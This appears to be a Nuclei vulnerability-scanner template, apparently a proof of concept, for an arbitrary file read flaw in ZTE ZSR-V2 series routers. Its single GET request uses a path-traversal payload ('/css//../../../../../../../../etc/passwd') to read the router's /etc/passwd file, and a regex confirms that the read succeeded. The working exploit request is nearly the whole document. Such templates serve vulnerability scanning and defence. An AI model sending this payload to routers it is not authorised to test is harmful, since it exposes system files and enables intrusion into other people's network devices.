id: ZTE-ZSRV2-lfi

info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 中兴ZTE-ZSR-V2系列多业务路由器存在任意文件读取漏洞，任意文件下载漏洞可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
  reference:
    - https://github.com/wy876/POC/commit/2fdfb36b6f8f039319461fd394e980d959ca062e
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/css//../../../../../../../../etc/passwd"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"